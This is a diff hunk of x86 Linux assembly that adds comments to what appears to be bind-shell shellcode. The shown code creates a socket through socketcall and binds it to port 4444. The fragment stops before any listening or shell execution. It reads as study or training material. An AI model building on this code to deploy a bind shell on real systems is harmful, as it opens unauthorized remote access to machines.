@@ -23,15 +23,22 @@ int 0x80 ;and execute
 mov esi, eax ;lets put socket call into esi so we can use it later
 
 ;bind(sock, (struct sockaddr *)&server, sockaddr_len);
+ 
+;First argument - server.sin_addr.s_addr = INADDR_ANY; 
+;Second argument - server.sin_port = htons(4444); //Using 4444 port
+;Third argument - server.sin_family = AF_INET;
 
 mov al,0x66 ;socket call. 101 in hex is 0x66
 mov bl,2  ;this is for bind 
 push edx 
 push word 0x5c11 ;push port no 4444 using host to network conversion
-push word bx
+push word bx ;Push 2 
 mov ecx, esp ;pushing (struct sockaddr *)&server to ecx
 
 ;Now lets make bind call
+;First argument -  sockaddr_len
+;Second argument - (struct sockaddr *)&server
+;Third argument - sock descriptor
 
 push byte 0x10 ;sockaddr_len
 push ecx ;(struct sockaddr *)&server
